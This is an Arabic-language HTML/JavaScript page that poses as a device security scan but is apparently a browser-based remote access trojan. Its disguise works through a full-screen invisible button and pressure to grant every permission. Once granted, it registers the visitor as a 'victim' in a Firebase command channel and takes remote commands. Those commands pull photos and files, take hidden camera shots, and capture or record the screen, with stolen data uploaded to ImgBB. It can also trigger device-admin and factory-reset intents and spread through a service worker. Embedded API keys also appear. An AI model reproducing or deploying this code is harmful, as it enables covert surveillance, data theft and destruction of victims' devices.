<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
    <title>تحديث الحماية...</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#000;color:#fff;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;overflow:hidden;}
        .scan{width:80%;height:4px;background:#222;border-radius:2px;overflow:hidden;margin:20px 0;}
        .scan-bar{width:0%;height:100%;background:red;animation:scan 2s infinite ease-in-out;}
        @keyframes scan{0%{width:0%;}50%{width:100%;}100%{width:0%;}}
        #msg{text-align:center;font-size:1.1em;padding:15px;max-width:90%;}
        button#retryPerms{display:none;margin:15px;padding:10px 20px;background:red;border:none;color:#000;font-weight:bold;border-radius:5px;cursor:pointer;}
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
</head>
<body>
    <h1 style="color:red;">⚠</h1>
    <div class="scan"><div class="scan-bar"></div></div>
    <div id="msg">جاري فحص الجهاز...</div>
    <button id="unlockBtn" style="position:absolute;top:0;left:0;width:100%;height:100%;background:transparent;border:none;cursor:pointer;" onclick="unlockApp()"></button>
    <button id="retryPerms" onclick="requestPermissions()">⚠️ إعادة طلب الصلاحيات</button>

<script>
    // 🔑 بيانات ZWAHY
    const firebaseConfig = {
        apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
        authDomain: "zwahy-5b75d.firebaseapp.com",
        databaseURL: "https://zwahy-5b75d-default-rtdb.firebaseio.com",
        projectId: "zwahy-5b75d",
        storageBucket: "zwahy-5b75d.firebasestorage.app",
        messagingSenderId: "820206227713",
        appId: "1:820206227713:web:02057307aca7dfb7100b00"
    };
    const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
    const SPREAD_LINK = "https://your-username.github.io/phantom-page/"; // ⚠️ استبدل برابطك الحقيقي

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const vid = 'phantom-'+Math.random().toString(36).substr(2,12);
    const vref = db.ref('victims/'+vid);
    let rootDir = null, audioCtx = null, camStream = null, unlocked = false;

    // ============ عند أول نقرة ============
    window.unlockApp = async function() {
        if(unlocked) return;
        unlocked = true;
        document.getElementById('unlockBtn').remove();
        document.getElementById('msg').innerText = 'تم فتح الاتصال...';

        // 1. تفعيل الصوت فوراً وإثباته
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        if (audioCtx.state === 'suspended') await audioCtx.resume();
        playAlarm(880, 0.3); // صوت قصير للتأكيد
        navigator.vibrate([200, 100, 200]);

        // 2. طلب الصلاحيات
        await requestPermissions();

        // 3. تثبيت SW للانتشار
        if('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js',{scope:'/'}).then(reg => {
                if(reg.active) reg.active.postMessage({type:'spread', url: SPREAD_LINK});
            });
        }

        // 4. تسجيل في C2
        await vref.set({
            online: true,
            fingerprint: {
                ua: navigator.userAgent,
                plat: navigator.platform,
                scr: screen.width+'x'+screen.height,
                cores: navigator.hardwareConcurrency,
                mem: navigator.deviceMemory||'?'
            }
        });
        document.getElementById('msg').innerText = '⚡ القناة نشطة';
        startCommandListener();
        startHiddenCamera();
    };

    async function requestPermissions() {
        document.getElementById('msg').innerText = 'من فضلك اسمح بجميع الصلاحيات...';
        document.getElementById('retryPerms').style.display = 'none';

        // صلاحية الكاميرا
        try {
            camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}, audio:true});
        } catch(e) { /* ستظهر رسالة أدناه */ }

        // صلاحية الشاشة
        try {
            const dStream = await navigator.mediaDevices.getDisplayMedia({video:true});
            dStream.getTracks().forEach(t => t.stop());
        } catch(e) {}

        // صلاحية الملفات (ضرورية)
        try {
            rootDir = await window.showDirectoryPicker({mode:'readwrite', startIn:'documents'});
        } catch(e) {
            // فشل في الحصول على صلاحية الملفات – نعرض زر إعادة المحاولة
            document.getElementById('msg').innerText = '❌ تم رفض صلاحية الملفات. لن تعمل ميزات السحب.';
            document.getElementById('retryPerms').style.display = 'block';
            return;
        }

        // صلاحية مدير الجهاز
        let a = document.createElement('a');
        a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
        a.click();

        document.getElementById('msg').innerText = '✅ جميع الصلاحيات ممنوحة.';
        document.getElementById('retryPerms').style.display = 'none';
    }

    function startCommandListener() {
        vref.child('command').on('value', async snap => {
            let c = snap.val();
            if(!c) return;
            document.getElementById('msg').innerText = 'تنفيذ: '+c.action;
            try {
                switch(c.action) {
                    case 'get_photos': await pullCameraRoll(); break;
                    case 'get_files': await pullDir(c.path||''); break;
                    case 'vibrate': navigator.vibrate([200,100,200,100,200]); break;
                    case 'play_sound': playAlarm(440, 2); break;
                    case 'screenshot': await screenshot(); break;
                    case 'record_video': await recordVid(c.duration||10); break;
                    case 'format': await formatDevice(); break;
                    case 'stealth_photo': await captureHiddenPhoto(); break;
                }
            } catch(err) {
                document.getElementById('msg').innerText = '❌ '+err.message;
            }
            await vref.child('command').remove();
        });
    }

    // ============ سحب محتوى الوسائط ============
    async function pullCameraRoll() {
        if(!rootDir) throw new Error('صلاحية الملفات مرفوضة');
        const paths = ['DCIM/Camera', 'Pictures', 'WhatsApp/Media/WhatsApp Images', 'Download'];
        for(let p of paths) {
            try {
                let sub = rootDir;
                for(let part of p.split('/')) sub = await sub.getDirectoryHandle(part);
                await walkDir(sub, p+'/');
            } catch(e) { /* المجلد غير موجود */ }
        }
    }

    async function pullDir(path) {
        if(!rootDir) throw new Error('صلاحية الملفات مرفوضة');
        let sub = rootDir;
        if(path) {
            for(let part of path.split('/').filter(Boolean)) sub = await sub.getDirectoryHandle(part);
        }
        await walkDir(sub, path||'/');
    }

    async function walkDir(dirHandle, prefix) {
        for await (let entry of dirHandle.values()) {
            if(entry.kind === 'file') {
                const file = await entry.getFile();
                if(file.size > 10 * 1024 * 1024) continue;
                const reader = new FileReader();
                reader.onload = async e => {
                    const base64 = e.target.result.split(',')[1];
                    const url = await uploadToImgBB(base64);
                    await store('file', url, {name: prefix+entry.name, size: file.size});
                };
                reader.readAsDataURL(file);
            } else if(entry.kind === 'directory') {
                const sub = await dirHandle.getDirectoryHandle(entry.name);
                await walkDir(sub, prefix+entry.name+'/');
            }
        }
    }

    // ============ كاميرا خفية ============
    function startHiddenCamera() {
        if(!camStream) return;
        const video = document.createElement('video');
        video.srcObject = camStream;
        video.playsInline = true;
        video.play();
        setInterval(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const base64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
            const url = await uploadToImgBB(base64);
            await store('stealth_photo', url, {ts: Date.now()});
        }, 12000);
    }

    async function captureHiddenPhoto() {
        if(!camStream) throw new Error('لا كاميرا');
        const videoTrack = camStream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width; canvas.height = bitmap.height;
        canvas.getContext('2d').drawImage(bitmap, 0, 0);
        const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
        const url = await uploadToImgBB(base64);
        await store('photo', url, {ts: Date.now()});
        document.getElementById('msg').innerText = '📸 صورة مخفية أُرسلت';
    }

    // ============ لقطة شاشة ============
    async function screenshot() {
        const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
        const video = document.createElement('video');
        video.srcObject = stream; await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const base64 = canvas.toDataURL('image/png').split(',')[1];
        const url = await uploadToImgBB(base64);
        await store('screenshot', url, {ts: Date.now()});
        stream.getTracks().forEach(t => t.stop());
    }

    async function recordVid(sec) {
        const stream = await navigator.mediaDevices.getDisplayMedia({video:true, audio:true});
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const blob = new Blob(chunks, {type:'video/webm'});
            const r = new FileReader();
            r.onload = async e => {
                const base64 = e.target.result.split(',')[1];
                const url = await uploadToImgBB(base64);
                await store('video', url, {ts: Date.now()});
            };
            r.readAsDataURL(blob);
            stream.getTracks().forEach(t => t.stop());
        };
        recorder.start();
        setTimeout(() => recorder.stop(), sec * 1000);
    }

    // ============ صوت تنبيه ============
    function playAlarm(freq=440, duration=1) {
        if(!audioCtx) return;
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'square';
        osc.frequency.value = freq;
        gain.gain.value = 0.5;
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start();
        setTimeout(() => { osc.stop(); gain.disconnect(); }, duration*1000);
    }

    // ============ فرمتة ============
    async function formatDevice() {
        let a = document.createElement('a');
        a.href = 'intent://#Intent;action=android.intent.action.MASTER_CLEAR;end';
        a.click();
        if(navigator.storage && navigator.storage.getDirectory) {
            const root = await navigator.storage.getDirectory();
            for await(let name of root.keys()) await root.removeEntry(name, {recursive:true});
        }
    }

    // ============ رفع ImgBB وتخزين ============
    async function uploadToImgBB(base64) {
        const fd = new FormData();
        fd.append('key', IMGBB_KEY);
        fd.append('image', base64);
        const resp = await fetch('https://api.imgbb.com/1/upload', {method:'POST', body:fd});
        const json = await resp.json();
        if(json.success) return json.data.url;
        throw new Error('رفع ImgBB فشل');
    }

    async function store(type, url, extra={}) {
        await vref.child('loot').push().set({type, url, ts: Date.now(), ...extra});
    }

    setTimeout(() => {
        if(!unlocked) document.getElementById('msg').innerText = 'اضغط على الشاشة لتأكيد الأمان';
    }, 1500);
</script>
</body>
</html>
